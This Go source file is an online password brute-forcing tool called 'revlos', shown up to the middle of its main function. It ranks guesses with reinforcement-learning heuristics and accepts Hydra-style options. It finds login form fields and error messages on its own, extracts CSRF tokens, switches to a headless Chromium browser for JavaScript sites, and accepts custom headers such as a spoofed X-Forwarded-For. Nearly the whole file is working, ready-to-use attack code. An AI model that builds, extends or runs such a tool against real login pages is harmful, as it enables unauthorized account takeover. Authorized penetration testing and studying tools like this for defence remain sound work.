package main

import (
	"bufio"
	"context"
	"flag"
	"fmt"
	"io"
	"math"
	"math/rand"
	"net/http"
	"net/http/cookiejar"
	"net/url"
	"os"
	"regexp"
	"sort"
	"strings"
	"sync"
	"sync/atomic"
	"time"

	"github.com/chromedp/chromedp"
)

type Credential struct {
	Username string
	Password string
	Score    float64
	Attempts int32
	Successes int32
}

// Ultimate RL: UCB1 + Genetic Algorithm + Thompson Sampling
type UltimateRL struct {
	mu sync.RWMutex
	// Multi-Armed Bandit (UCB1)
	armScores     map[string]*ArmStats
	totalPulls    int64
	// Pattern DNA for genetic algorithm
	patterns      []*PatternDNA
	generation    int
	// Thompson Sampling parameters
	alphaBeta     map[string]*BetaDistribution
	// Enhanced features
	usernameScores map[string]float64
	passwordScores map[string]float64
	prefixScores   map[string]float64
	suffixScores   map[string]float64
	lengthScores   map[int]float64
	charsetScores  map[string]float64
	pairHistory    map[string]map[string]float64
	// Exploitation tracking
	exploitMode    bool
	topPatterns    []string
	learningRate   float64
	// Performance optimizations
	scoreCache     map[string]float64  // Cache computed scores
	cacheVersion   int                 // Invalidate cache when scores change
	pendingBoosts  []boostJob          // Lazy success boosting
}

type ArmStats struct {
	pulls       int64
	totalReward float64
	mu          sync.Mutex
}

type PatternDNA struct {
	Genes       []string // Pattern components
	Fitness     float64
	Generation  int
}

type BetaDistribution struct {
	alpha float64
	beta  float64
	mu    sync.Mutex
}

type boostJob struct {
	username   string
	password   string
	baseReward float64
}

func NewUltimateRL() *UltimateRL {
	return &UltimateRL{
		armScores:      make(map[string]*ArmStats),
		alphaBeta:      make(map[string]*BetaDistribution),
		usernameScores: make(map[string]float64),
		passwordScores: make(map[string]float64),
		prefixScores:   make(map[string]float64),
		suffixScores:   make(map[string]float64),
		lengthScores:   make(map[int]float64),
		charsetScores:  make(map[string]float64),
		pairHistory:    make(map[string]map[string]float64),
		patterns:       make([]*PatternDNA, 0),
		learningRate:   0.4,
		exploitMode:    false,
		scoreCache:     make(map[string]float64),
		cacheVersion:   0,
		pendingBoosts:  make([]boostJob, 0),
	}
}

// UCB1: Upper Confidence Bound for optimal exploration/exploitation
func (rl *UltimateRL) computeUCB1(armKey string) float64 {
	rl.mu.RLock()
	arm, exists := rl.armScores[armKey]
	totalPulls := atomic.LoadInt64(&rl.totalPulls)
	rl.mu.RUnlock()

	if !exists || totalPulls == 0 {
		return math.MaxFloat64 // Explore untried arms first
	}

	arm.mu.Lock()
	pulls := arm.pulls
	avgReward := 0.0
	if pulls > 0 {
		avgReward = arm.totalReward / float64(pulls)
	}
	arm.mu.Unlock()

	if pulls == 0 {
		return math.MaxFloat64
	}

	// UCB1 formula: avgReward + sqrt(2*ln(totalPulls)/pulls)
	exploration := math.Sqrt(2.0 * math.Log(float64(totalPulls)) / float64(pulls))
	return avgReward + exploration
}

// Thompson Sampling: Bayesian approach for adaptive learning
func (rl *UltimateRL) sampleThompson(key string) float64 {
	rl.mu.RLock()
	dist, exists := rl.alphaBeta[key]
	rl.mu.RUnlock()

	if !exists {
		rl.mu.Lock()
		rl.alphaBeta[key] = &BetaDistribution{alpha: 1.0, beta: 1.0}
		dist = rl.alphaBeta[key]
		rl.mu.Unlock()
	}

	dist.mu.Lock()
	alpha, beta := dist.alpha, dist.beta
	dist.mu.Unlock()

	// Sample from Beta(alpha, beta)
	return sampleBeta(alpha, beta)
}

func sampleBeta(alpha, beta float64) float64 {
	// Simple Beta sampling using Gamma distributions
	g1 := sampleGamma(alpha)
	g2 := sampleGamma(beta)
	if g1+g2 == 0 {
		return 0.5
	}
	return g1 / (g1 + g2)
}

func sampleGamma(alpha float64) float64 {
	// Marsaglia and Tsang method for Gamma sampling
	if alpha < 1 {
		return sampleGamma(alpha+1) * math.Pow(rand.Float64(), 1.0/alpha)
	}
	d := alpha - 1.0/3.0
	c := 1.0 / math.Sqrt(9.0*d)
	for {
		x := rand.NormFloat64()
		v := 1.0 + c*x
		if v <= 0 {
			continue
		}
		v = v * v * v
		u := rand.Float64()
		if u < 1.0-0.0331*(x*x)*(x*x) {
			return d * v
		}
		if math.Log(u) < 0.5*x*x+d*(1.0-v+math.Log(v)) {
			return d * v
		}
	}
}

// Genetic Algorithm: Cross-breed successful patterns
func (rl *UltimateRL) evolvePatterns(successUser, successPass string, reward float64) {
	rl.mu.Lock()
	defer rl.mu.Unlock()

	// Create new pattern DNA
	dna := &PatternDNA{
		Genes: []string{
			successUser,
			successPass,
			extractPrefix(successPass, 2),
			extractSuffix(successPass, 2),
			fmt.Sprintf("len:%d", len(successPass)),
			getCharset(successPass),
		},
		Fitness:    reward,
		Generation: rl.generation,
	}

	rl.patterns = append(rl.patterns, dna)

	// Keep top 20 patterns
	if len(rl.patterns) > 20 {
		sort.Slice(rl.patterns, func(i, j int) bool {
			return rl.patterns[i].Fitness > rl.patterns[j].Fitness
		})
		rl.patterns = rl.patterns[:20]
	}

	// Cross-breed top patterns (genetic recombination)
	if len(rl.patterns) >= 2 && reward > 1000.0 {
		parent1 := rl.patterns[0]
		parent2 := rl.patterns[1]

		// Create offspring by combining genes (limit to 10 genes max)
		offspring := &PatternDNA{
			Genes:      make([]string, 0, 10),
			Fitness:    (parent1.Fitness + parent2.Fitness) / 2.0,
			Generation: rl.generation + 1,
		}

		maxGenes := 10
		genesAdded := 0
		for i := 0; i < len(parent1.Genes) && genesAdded < maxGenes; i++ {
			if rand.Float64() < 0.5 && i < len(parent2.Genes) {
				offspring.Genes = append(offspring.Genes, parent1.Genes[i])
				genesAdded++
			} else if i < len(parent2.Genes) {
				offspring.Genes = append(offspring.Genes, parent2.Genes[i])
				genesAdded++
			}
		}

		rl.patterns = append(rl.patterns, offspring)
	}
}

// Learn from attempt with multiple algorithms
func (rl *UltimateRL) learn(username, password string, respTime time.Duration, success bool) {
	atomic.AddInt64(&rl.totalPulls, 1)

	// Calculate reward
	baseReward := 1.0 / float64(respTime.Milliseconds()+1)
	if success {
		baseReward *= 50000.0 // Massive reward for success
		rl.evolvePatterns(username, password, baseReward)

		// Switch to exploit mode after first success
		rl.mu.Lock()
		rl.exploitMode = true
		rl.mu.Unlock()
	}

	// Update UCB1 arms
	armKey := fmt.Sprintf("%s:%s", username, password)
	rl.mu.Lock()
	if rl.armScores[armKey] == nil {
		rl.armScores[armKey] = &ArmStats{}
	}
	arm := rl.armScores[armKey]
	rl.mu.Unlock()

	arm.mu.Lock()
	arm.pulls++
	arm.totalReward += baseReward
	arm.mu.Unlock()

	// Update Thompson Sampling
	rl.mu.Lock()
	if rl.alphaBeta[armKey] == nil {
		rl.alphaBeta[armKey] = &BetaDistribution{alpha: 1.0, beta: 1.0}
	}
	dist := rl.alphaBeta[armKey]
	rl.mu.Unlock()

	dist.mu.Lock()
	if success {
		dist.alpha += baseReward / 1000.0
	} else {
		dist.beta += 1.0
	}
	dist.mu.Unlock()

	// Pattern learning
	rl.mu.Lock()
	rl.usernameScores[username] += rl.learningRate * baseReward
	rl.passwordScores[password] += rl.learningRate * baseReward

	if len(password) >= 2 {
		prefix := password[:2]
		suffix := password[len(password)-2:]
		rl.prefixScores[prefix] += rl.learningRate * baseReward * 3.0
		rl.suffixScores[suffix] += rl.learningRate * baseReward * 3.0
	}
	rl.lengthScores[len(password)] += rl.learningRate * baseReward * 2.5
	rl.charsetScores[getCharset(password)] += rl.learningRate * baseReward * 2.5

	if rl.pairHistory[username] == nil {
		rl.pairHistory[username] = make(map[string]float64)
	}
	rl.pairHistory[username][password] += rl.learningRate * baseReward * 5.0

	// Lazy success boosting - queue for next prioritization instead of immediate O(n) scan
	if success {
		rl.pendingBoosts = append(rl.pendingBoosts, boostJob{
			username:   username,
			password:   password,
			baseReward: baseReward,
		})
		rl.cacheVersion++ // Invalidate cache when scores will change
	}
	rl.mu.Unlock()
}

func (rl *UltimateRL) computeScore(username, password string) float64 {
	armKey := fmt.Sprintf("%s:%s", username, password)

	// Check cache first
	rl.mu.RLock()
	if cachedScore, ok := rl.scoreCache[armKey]; ok {
		rl.mu.RUnlock()
		return cachedScore
	}
	rl.mu.RUnlock()

	// Combine all algorithms
	ucb1Score := rl.computeUCB1(armKey)
	thompsonScore := rl.sampleThompson(armKey) * 1000.0

	rl.mu.RLock()
	defer rl.mu.RUnlock()

	score := 0.0

	// If in exploit mode, heavily favor patterns
	if rl.exploitMode {
		score += rl.usernameScores[username] * 5.0
		score += rl.passwordScores[password] * 5.0
	} else {
		score += rl.usernameScores[username] * 2.0
		score += rl.passwordScores[password] * 2.0
	}

	// Pattern scores
	if len(password) >= 2 {
		score += rl.prefixScores[password[:2]] * 2.5
		score += rl.suffixScores[password[len(password)-2:]] * 2.5
	}
	score += rl.lengthScores[len(password)] * 2.0
	score += rl.charsetScores[getCharset(password)] * 2.0

	// Genetic pattern matching (optimized: early exit on first match per pattern)
	passPrefix := ""
	if len(password) >= 2 {
		passPrefix = password[:2]
	}

	for _, pattern := range rl.patterns {
		matchScore := 0.0
		matched := false
		for _, gene := range pattern.Genes {
			if gene == username || gene == password {
				matchScore += pattern.Fitness * 0.5
				matched = true
				break // Early exit on exact match
			}
			if passPrefix != "" && strings.Contains(gene, passPrefix) {
				matchScore += pattern.Fitness * 0.3
				matched = true
			}
			if matched {
				break
			}
		}
		score += matchScore
	}

	// Correlation bonus (optimized: only check exact username)
	if pairs, ok := rl.pairHistory[username]; ok {
		if pairScore, exists := pairs[password]; exists {
			score += pairScore * 2.0 // Exact match bonus
		} else if len(password) >= 2 {
			// Check prefix/suffix matches only if no exact match
			for p, pairScore := range pairs {
				if len(p) >= 2 {
					if p[:2] == password[:2] {
						score += pairScore * 1.2
						break // Only first match
					}
				}
			}
		}
	}

	// Combine with UCB1 and Thompson
	finalScore := score + ucb1Score*10.0 + thompsonScore*5.0

	return finalScore
}

func (rl *UltimateRL) applyPendingBoosts() {
	// Apply queued success boosts in batch
	if len(rl.pendingBoosts) == 0 {
		return
	}

	for _, boost := range rl.pendingBoosts {
		username := boost.username
		password := boost.password
		baseReward := boost.baseReward

		// Boost similar usernames (only first 3 chars)
		if len(username) >= 3 {
			prefix := username[:3]
			for u := range rl.usernameScores {
				if strings.HasPrefix(u, prefix) {
					rl.usernameScores[u] += baseReward * 0.8
				}
			}
		}

		// Boost passwords with same prefix/suffix/length
		if len(password) >= 2 {
			for p := range rl.passwordScores {
				if len(p) >= 2 {
					if p[:2] == password[:2] {
						rl.passwordScores[p] += baseReward * 0.7
					}
					if p[len(p)-2:] == password[len(password)-2:] {
						rl.passwordScores[p] += baseReward * 0.6
					}
					if len(p) == len(password) {
						rl.passwordScores[p] += baseReward * 0.4
					}
				}
			}
		}
	}

	// Clear pending boosts
	rl.pendingBoosts = rl.pendingBoosts[:0]
}

func (rl *UltimateRL) prioritize(creds []Credential) []Credential {
	rl.mu.Lock()
	rl.generation++

	// Apply any pending success boosts before prioritization
	rl.applyPendingBoosts()

	// Clear score cache since we've updated scores
	rl.scoreCache = make(map[string]float64)
	rl.mu.Unlock()

	for i := range creds {
		creds[i].Score = rl.computeScore(creds[i].Username, creds[i].Password)
	}

	sort.Slice(creds, func(i, j int) bool {
		return creds[i].Score > creds[j].Score
	})

	return creds
}

func extractPrefix(s string, n int) string {
	if len(s) < n { return s }
	return s[:n]
}

func extractSuffix(s string, n int) string {
	if len(s) < n { return s }
	return s[len(s)-n:]
}

func getCharset(s string) string {
	hasLower, hasUpper, hasDigit, hasSymbol := false, false, false, false
	for _, c := range s {
		switch {
		case c >= 'a' && c <= 'z': hasLower = true
		case c >= 'A' && c <= 'Z': hasUpper = true
		case c >= '0' && c <= '9': hasDigit = true
		default: hasSymbol = true
		}
	}
	return fmt.Sprintf("l%dt%dd%ds%d",
		map[bool]int{true:1,false:0}[hasLower],
		map[bool]int{true:1,false:0}[hasUpper],
		map[bool]int{true:1,false:0}[hasDigit],
		map[bool]int{true:1,false:0}[hasSymbol])
}

func min(a, b int) int {
	if a < b { return a }
	return b
}

// Auto-detect form fields and error messages
type FormDetection struct {
	Path          string
	UsernameField string
	PasswordField string
	ErrorMessage  string
	Method        string
	IsSPA         bool
	SPAReason     string
}

func detectFormFields(targetURL string) (*FormDetection, error) {
	// Create client with cookie jar to handle redirects properly
	jar, _ := cookiejar.New(nil)
	client := &http.Client{
		Jar: jar,
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			if len(via) >= 10 {
				return fmt.Errorf("too many redirects")
			}
			return nil
		},
	}

	resp, err := client.Get(targetURL)
	if err != nil {
		return nil, fmt.Errorf("failed to fetch page: %v", err)
	}
	defer resp.Body.Close()

	body, _ := io.ReadAll(resp.Body)
	bodyStr := string(body)

	detection := &FormDetection{
		Path:   "/",
		Method: "POST",
	}

	// Check if this is a SPA/JavaScript-heavy site
	isSPA, spaReason := detectSPA(bodyStr)
	detection.IsSPA = isSPA
	detection.SPAReason = spaReason

	// Parse URL path
	parsedURL, _ := url.Parse(targetURL)
	detection.Path = parsedURL.Path
	if detection.Path == "" {
		detection.Path = "/"
	}

	// Detect form method from HTML
	if strings.Contains(bodyStr, `method="get"`) || strings.Contains(bodyStr, `method='get'`) || strings.Contains(bodyStr, `method=get`) {
		detection.Method = "GET"
	} else if strings.Contains(bodyStr, `method="post"`) || strings.Contains(bodyStr, `method='post'`) || strings.Contains(bodyStr, `method=post`) {
		detection.Method = "POST"
	}

	// Expanded username field names (priority order)
	usernameFields := []string{
		"username", "user", "login", "email", "usr", "account",
		"uname", "userid", "user_id", "loginid", "login_id",
		"email_address", "emailaddress", "user_name", "userName",
	}
	// Expanded password field names
	passwordFields := []string{
		"password", "pass", "pwd", "passwd", "passw",
		"user_password", "user_pass", "userpass", "user_pwd",
	}

	// Detect username field
	for _, field := range usernameFields {
		patterns := []string{
			fmt.Sprintf(`name="%s"`, field),
			fmt.Sprintf(`name='%s'`, field),
			fmt.Sprintf(`name=%s`, field),
			fmt.Sprintf(`id="%s"`, field),
		}
		for _, pattern := range patterns {
			if strings.Contains(bodyStr, pattern) {
				detection.UsernameField = field
				break
			}
		}
		if detection.UsernameField != "" {
			break
		}
	}

	// Detect password field
	for _, field := range passwordFields {
		patterns := []string{
			fmt.Sprintf(`name="%s"`, field),
			fmt.Sprintf(`name='%s'`, field),
			fmt.Sprintf(`name=%s`, field),
			fmt.Sprintf(`id="%s"`, field),
		}
		for _, pattern := range patterns {
			if strings.Contains(bodyStr, pattern) {
				detection.PasswordField = field
				break
			}
		}
		if detection.PasswordField != "" {
			break
		}
	}

	// Defaults if not found
	if detection.UsernameField == "" {
		detection.UsernameField = "username"
	}
	if detection.PasswordField == "" {
		detection.PasswordField = "password"
	}

	return detection, nil
}

func detectErrorMessage(targetURL, userField, passField, method string) (string, error) {
	// Try with obviously wrong credentials
	testCreds := [][]string{
		{"wronguser123", "wrongpass123"},
		{"admin", "wrongpass999"},
	}

	errorPatterns := []string{
		"invalid credentials", "invalid username", "invalid password",
		"incorrect", "wrong", "failed", "error",
		"denied", "unauthorized", "bad credentials",
	}

	var errorCandidates []string

	for _, creds := range testCreds {
		data := url.Values{}
		data.Set(userField, creds[0])
		data.Set(passField, creds[1])

		var resp *http.Response
		var err error

		if strings.ToUpper(method) == "GET" {
			// GET: Add parameters to URL
			testWithParams := targetURL
			if strings.Contains(targetURL, "?") {
				testWithParams += "&" + data.Encode()
			} else {
				testWithParams += "?" + data.Encode()
			}
			resp, err = http.Get(testWithParams)
		} else {
			// POST: Send as form data
			resp, err = http.Post(targetURL, "application/x-www-form-urlencoded", strings.NewReader(data.Encode()))
		}
		if err != nil {
			continue
		}

		body, _ := io.ReadAll(resp.Body)
		resp.Body.Close()
		bodyStr := string(body)
		bodyLower := strings.ToLower(bodyStr)

		// Look for exact phrase matches first (case-insensitive)
		for _, pattern := range errorPatterns {
			if strings.Contains(bodyLower, pattern) {
				// Find the exact text with original casing
				idx := strings.Index(bodyLower, pattern)
				if idx != -1 {
					// Extract with original casing
					extracted := bodyStr[idx : idx+len(pattern)]
					// Filter out CSS, HTML tags, or very long strings
					if !strings.Contains(extracted, "{") &&
						!strings.Contains(extracted, "}") &&
						!strings.Contains(extracted, "<") &&
						!strings.Contains(extracted, ">") &&
						!strings.Contains(extracted, ";") &&
						len(extracted) < 50 {
						errorCandidates = append(errorCandidates, extracted)
					}
				}
			}
		}

		// Also look for <p class="error"> or similar
		if strings.Contains(bodyLower, "class=\"error\"") || strings.Contains(bodyLower, "class='error'") {
			// Extract text between error tags
			start := strings.Index(bodyLower, "error")
			if start != -1 {
				// Find the next > and then extract until <
				gtIdx := strings.Index(bodyStr[start:], ">")
				if gtIdx != -1 {
					textStart := start + gtIdx + 1
					ltIdx := strings.Index(bodyStr[textStart:], "<")
					if ltIdx != -1 && ltIdx < 100 {
						errorText := strings.TrimSpace(bodyStr[textStart : textStart+ltIdx])
						if len(errorText) > 5 && len(errorText) < 50 {
							errorCandidates = append(errorCandidates, errorText)
						}
					}
				}
			}
		}
	}

	// Return shortest clean error message
	if len(errorCandidates) > 0 {
		shortest := errorCandidates[0]
		for _, candidate := range errorCandidates {
			if len(candidate) < len(shortest) && len(candidate) > 5 {
				shortest = candidate
			}
		}
		return shortest, nil
	}

	// Default fallback
	return "Invalid credentials", nil
}

func loadWordlist(path string) ([]string, error) {
	var file *os.File
	var err error

	// Check if it's a URL or file path
	if strings.HasPrefix(path, "http://") || strings.HasPrefix(path, "https://") {
		resp, err := http.Get(path)
		if err != nil {
			return nil, err
		}
		defer resp.Body.Close()

		var words []string
		scanner := bufio.NewScanner(resp.Body)
		for scanner.Scan() {
			if word := strings.TrimSpace(scanner.Text()); word != "" {
				words = append(words, word)
			}
		}
		return words, scanner.Err()
	}

	// Local file
	file, err = os.Open(path)
	if err != nil {
		return nil, err
	}
	defer file.Close()

	var words []string
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		if word := strings.TrimSpace(scanner.Text()); word != "" {
			words = append(words, word)
		}
	}
	return words, scanner.Err()
}

// extractCSRF extracts CSRF token from HTML body by field name
func extractCSRF(htmlBody, fieldName string) string {
	// Try: <input ... name="CSRFToken" value="..." ...>
	re := regexp.MustCompile(`<input[^>]*name="` + regexp.QuoteMeta(fieldName) + `"[^>]*value="([^"]+)"`)
	if matches := re.FindStringSubmatch(htmlBody); len(matches) > 1 {
		return matches[1]
	}
	// Try: <input ... value="..." ... name="CSRFToken" ...>
	re = regexp.MustCompile(`<input[^>]*value="([^"]+)"[^>]*name="` + regexp.QuoteMeta(fieldName) + `"`)
	if matches := re.FindStringSubmatch(htmlBody); len(matches) > 1 {
		return matches[1]
	}
	// Try meta tag: <meta name="csrf-token" content="...">
	re = regexp.MustCompile(`<meta[^>]*name="` + regexp.QuoteMeta(fieldName) + `"[^>]*content="([^"]+)"`)
	if matches := re.FindStringSubmatch(htmlBody); len(matches) > 1 {
		return matches[1]
	}
	return ""
}

// detectSPA checks if the target appears to be a Single-Page Application or JavaScript-heavy
func detectSPA(htmlBody string) (bool, string) {
	indicators := []struct {
		pattern string
		reason  string
	}{
		// JavaScript frameworks
		{`react`, "React framework detected"},
		{`vue`, "Vue framework detected"},
		{`angular`, "Angular framework detected"},
		{`ng-app`, "Angular app detected"},
		{`data-reactroot`, "React root detected"},
		{`__vue__`, "Vue instance detected"},
		// AJAX patterns
		{`XMLHttpRequest`, "XMLHttpRequest usage detected"},
		{`fetch\(`, "Fetch API usage detected"},
		{`axios`, "Axios HTTP client detected"},
		{`$.ajax`, "jQuery AJAX detected"},
		{`data-ajax`, "AJAX data attribute detected"},
		{`no-ajax`, "AJAX marker detected"},
		// Client-side routing
		{`router`, "Client-side router detected"},
		{`history.pushState`, "History API detected"},
		{`#/`, "Hash-based routing detected"},
		// Common SPA build artifacts
		{`webpack`, "Webpack bundle detected"},
		{`__webpack`, "Webpack runtime detected"},
		{`/app.js`, "App bundle detected"},
		{`/bundle.js`, "Bundle detected"},
		{`/main.js`, "Main bundle detected"},
		// Single Page indicators
		{`single-page`, "Single-page application marker"},
		{`spa-`, "SPA marker detected"},
		{`data-base-target`, "Dynamic content container detected"},
		{`data-ng-`, "Angular data binding detected"},
		{`v-if`, "Vue.js directive detected"},
		{`v-for`, "Vue.js list rendering detected"},
	}

	bodyLower := strings.ToLower(htmlBody)

	for _, ind := range indicators {
		if strings.Contains(bodyLower, ind.pattern) {
			return true, ind.reason
		}
	}

	return false, ""
}

// Headless browser authentication for JavaScript-based sites
func attemptLoginHeadless(ctx context.Context, targetURL, userField, passField, username, password string, successIndicators map[string]string) (bool, time.Duration) {
	start := time.Now()

	// Create browser context with timeout
	browserCtx, cancel := chromedp.NewContext(ctx, chromedp.WithLogf(func(string, ...interface{}) {}))
	defer cancel()

	timeoutCtx, timeoutCancel := context.WithTimeout(browserCtx, 15*time.Second)
	defer timeoutCancel()

	var finalURL string
	var pageContent string

	// Navigate, fill form, submit, and check result
	err := chromedp.Run(timeoutCtx,
		chromedp.Navigate(targetURL),
		chromedp.WaitVisible(`input[name="`+userField+`"],input[id="`+userField+`"]`, chromedp.ByQuery),
		chromedp.SendKeys(`input[name="`+userField+`"],input[id="`+userField+`"]`, username, chromedp.ByQuery),
		chromedp.SendKeys(`input[name="`+passField+`"],input[id="`+passField+`"]`, password, chromedp.ByQuery),
		chromedp.Click(`button[type="submit"],input[type="submit"],button[id="submit"]`, chromedp.ByQuery),
		chromedp.Sleep(2*time.Second), // Wait for redirect/response
		chromedp.Location(&finalURL),
		chromedp.OuterHTML("html", &pageContent, chromedp.ByQuery),
	)

	elapsed := time.Since(start)

	if err != nil {
		return false, elapsed
	}

	// Check success indicators
	pageContentLower := strings.ToLower(pageContent)
	finalURLLower := strings.ToLower(finalURL)

	// First check: If we're still on login page with password field, it's a failure
	if strings.Contains(finalURLLower, "login") || strings.Contains(finalURLLower, "signin") || strings.Contains(finalURLLower, "auth") {
		// Check if password field is still present
		if strings.Contains(pageContentLower, `type="password"`) || strings.Contains(pageContentLower, `type='password'`) {
			return false, elapsed
		}
	}

	// Check for explicit failure indicators
	if failureText, ok := successIndicators["failure"]; ok {
		if strings.Contains(pageContent, failureText) {
			return false, elapsed
		}
	}

	// Check for common failure text
	failureIndicators := []string{
		"invalid credentials", "invalid username", "invalid password",
		"incorrect password", "incorrect username", "login failed",
		"authentication failed", "access denied", "wrong password",
		"wrong username", "try again", "login error",
	}
	for _, indicator := range failureIndicators {
		if strings.Contains(pageContentLower, indicator) {
			return false, elapsed
		}
	}

	// Positive success indicators
	// 1. URL contains success path (specific paths like /dashboard, /account)
	if successURL, ok := successIndicators["url"]; ok {
		if successURL != "logged-in-successfully" && strings.Contains(finalURL, successURL) {
			return true, elapsed
		}
	}

	// 2. Success text in page
	if successText, ok := successIndicators["text"]; ok {
		if strings.Contains(pageContent, successText) {
			return true, elapsed
		}
	}

	// 3. Check for common success indicators
	successPaths := []string{"/dashboard", "/account", "/home", "/portal", "/main", "/overview"}
	for _, path := range successPaths {
		if strings.Contains(finalURLLower, path) && !strings.Contains(pageContentLower, `type="password"`) {
			return true, elapsed
		}
	}

	// 4. Logout button/link present (indicates we're logged in)
	logoutIndicators := []string{"logout", "log out", "sign out", "signout"}
	for _, indicator := range logoutIndicators {
		if strings.Contains(pageContentLower, indicator) && !strings.Contains(pageContentLower, `type="password"`) {
			return true, elapsed
		}
	}

	// Default to failure if nothing definitive found
	return false, elapsed
}

func main() {
	rand.Seed(time.Now().UnixNano())

	// Hydra-compatible CLI parameters
	var (
		username       = flag.String("l", "", "Single username (literal)")
		usernameList   = flag.String("L", "", "Username list file")
		password       = flag.String("p", "", "Single password (literal)")
		passwordList   = flag.String("P", "", "Password list file")
		host           = flag.String("host", "", "Target host (or use positional argument)")
		port           = flag.Int("s", 80, "Port number")
		stopOnFirst    = flag.Bool("f", false, "Stop when first valid credential found")
		workers        = flag.Int("t", 100, "Number of parallel tasks (threads)")
		quiet          = flag.Bool("q", false, "Quiet mode - less output")
		verbose        = flag.Bool("v", false, "Verbose mode - show attempts")
		autoMode       = flag.Bool("auto", false, "Auto-detect form fields and error messages")
		timeout        = flag.Int("timeout", 10, "Request timeout in seconds")
		maxTime        = flag.Int("max-time", 0, "Maximum total time in seconds (0 = no limit)")
		successText    = flag.String("success-text", "", "Text in response body indicating success")
		successCookie  = flag.String("success-cookie", "", "Cookie name that indicates success")
		successCode    = flag.String("success-code", "", "HTTP status codes for success (comma-separated, e.g., 200,302)")
		anyRedirect    = flag.Bool("any-redirect", false, "Treat any redirect (3xx) as success")
		method         = flag.String("method", "POST", "HTTP method (GET or POST)")
		headers        = flag.String("header", "", "Custom headers (comma-separated, e.g., 'X-Forwarded-For:1.1.1.1,Referer:http://example.com')")
		headless       = flag.Bool("headless", false, "Use headless browser for JavaScript-based authentication")
	)

	flag.Parse()

	// Parse arguments: host [http-post-form] "form-spec"
	args := flag.Args()
	if len(args) < 1 {
		fmt.Println("溺 revlos - Ultimate RL Brute Forcer")
		fmt.Println("Usage: revlos [-l user | -L userlist] [-p pass | -P passlist] -f host -s port [--auto | http-post-form \"spec\"]")
		fmt.Println("\nHydra-compatible parameters:")
		fmt.Println("  -l <user>     Single username (literal)")
		fmt.Println("  -L <file>     Username list file or URL")
		fmt.Println("  -p <pass>     Single password (literal)")
		fmt.Println("  -P <file>     Password list file or URL")
		fmt.Println("  -f            Stop on first valid credential")
		fmt.Println("  -s <port>     Port (default: 80)")
		fmt.Println("  -t <tasks>    Parallel tasks/threads (default: 100)")
		fmt.Println("  -q                Quiet mode")
		fmt.Println("  -v                Verbose mode")
		fmt.Println("  --auto            Auto-detect form fields and error messages")
		fmt.Println("  --timeout <n>     Request timeout in seconds (default: 10)")
		fmt.Println("  --max-time <n>    Maximum total time in seconds (default: no limit)")
		fmt.Println("  --success-text <s>   Text in response indicating success")
		fmt.Println("  --success-cookie <s> Cookie name indicating success")
		fmt.Println("  --success-code <c>   HTTP codes for success (e.g., 200,302)")
		fmt.Println("  --any-redirect    Treat any 3xx redirect as success")
		fmt.Println("  --method <m>      HTTP method: GET or POST (default: POST)")
		fmt.Println("  --header <h>      Custom headers (e.g., 'Referer:http://x.com,X-Forwarded-For:1.1.1.1')")
		fmt.Println("  --headless        Use headless browser (--auto mode auto-switches if SPA detected)")
		fmt.Println("\nPositional arguments:")
		fmt.Println("  <host>                Target host or IP")
		fmt.Println("  http-post-form        Optional literal (can be omitted)")
		fmt.Println("  \"form-spec\"           Format: \"path:params:failure_condition\"")
		fmt.Println("\nExamples:")
		fmt.Println("  Manual:  revlos -L users.txt -P passwords.txt -s 8080 -f target.com http-post-form \"/:username=^USER^&password=^PASS^:F=Invalid\"")
		fmt.Println("  Auto:    revlos -L users.txt -P passwords.txt -s 8080 -f --auto target.com")
		fmt.Println("  Custom:  revlos -L users.txt -P passwords.txt --any-redirect --timeout 30 target.com http-post-form \"/:user=^USER^&pass=^PASS^:F=Error\"")
		os.Exit(1)
	}

	targetHost := args[0]
	if *host != "" {
		targetHost = *host
	}

	// Build initial target URL for auto-detection
	baseURL := targetHost
	// If URL doesn't have a scheme, add one
	if !strings.HasPrefix(targetHost, "http://") && !strings.HasPrefix(targetHost, "https://") {
		scheme := "http"
		if *port == 443 {
			scheme = "https"
		}
		baseURL = fmt.Sprintf("%s://%s:%d", scheme, targetHost, *port)
	}

	var path, params, failureString, userField, passField string
	var useBasicAuth bool

	// Auto-detection mode
	if *autoMode {
		if !*quiet {
			fmt.Println(" Auto-detection mode enabled...")
			fmt.Printf(" Fetching target: %s\n", baseURL)
		}

		// Check for HTTP Basic Auth first
		testResp, err := http.Get(baseURL)
		if err == nil {
			defer testResp.Body.Close()
			if testResp.StatusCode == 401 {
				authHeader := testResp.Header.Get("WWW-Authenticate")
				if strings.HasPrefix(authHeader, "Basic") {
					useBasicAuth = true
					if !*quiet {
						fmt.Println(" Detected HTTP Basic Authentication")
					}
				}
			}
		}

		// If Basic Auth, skip form detection
		if useBasicAuth {
			path = "/"
			if !*quiet {
				fmt.Println()
			}
		} else {
			// Detect form fields
			detection, err := detectFormFields(baseURL)
		if err != nil {
			fmt.Printf("❌ Auto-detection failed: %v\n", err)
			os.Exit(1)
		}

		path = detection.Path
		userField = detection.UsernameField
		passField = detection.PasswordField

		if !*quiet {
			fmt.Printf("✓ Detected username field: %s\n", userField)
			fmt.Printf("✓ Detected password field: %s\n", passField)
			fmt.Printf("✓ Detected path: %s\n", path)

			// Check if SPA detected and auto-switch
			if detection.IsSPA {
				fmt.Printf("⚠️  SPA/JavaScript detected: %s\n", detection.SPAReason)
				if !*headless {
					fmt.Println(" Auto-switching to headless mode for compatibility...")
					*headless = true
				} else {
					fmt.Println("✓ Using headless mode (recommended for SPAs)")
				}
			}

			fmt.Println(" Detecting error message...")
		}

		// Detect error message
		// If baseURL already contains the path, don't append it again
		testURL := baseURL
		if !strings.Contains(baseURL, path) {
			testURL = fmt.Sprintf("%s%s", baseURL, path)
		}
		// Use detected method or fall back to CLI flag
		detectedMethod := detection.Method
		if detectedMethod == "" {
			detectedMethod = *method
		}
		failureString, err = detectErrorMessage(testURL, userField, passField, detectedMethod)
		if err != nil {
			fmt.Printf("⚠️  Could not detect error message, using default\n")
			failureString = "Invalid credentials"
		}

		if !*quiet {
			fmt.Printf("✓ Detected error message: \"%s\"\n", failureString)
			fmt.Println()
		}

		params = fmt.Sprintf("%s=^USER^&%s=^PASS^", userField, passField)
		}
	} else {
		// Manual mode - parse form spec
		formSpec := ""
		if len(args) >= 2 {
			if args[1] == "http-post-form" && len(args) >= 3 {
				formSpec = args[2]
			} else {
				formSpec = args[1]
			}
		}

		if formSpec == "" {
			fmt.Printf("❌ Missing form specification (use --auto for auto-detection)\n")
			os.Exit(1)
		}

		// Parse http-post-form: "path:params:condition"
		parts := strings.SplitN(formSpec, ":", 3)
		if len(parts) < 3 {
